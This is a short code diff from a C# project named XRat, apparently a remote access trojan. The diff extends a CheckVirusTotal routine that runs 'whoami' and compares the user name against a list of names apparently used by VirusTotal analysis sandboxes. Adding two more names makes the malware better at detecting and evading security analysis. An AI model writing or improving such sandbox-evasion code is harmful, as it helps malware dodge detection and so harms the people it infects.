@@ -195,7 +195,7 @@ namespace XRat
 
         public static void CheckVirusTotal()
         {
-            string[] virusTotalUsers = ["azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];
+            string[] virusTotalUsers = ["shloblack", "seanwalla", "azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];
 
             string username = ProCMD("whoami").output;
             username = username.Split('\\')[1];
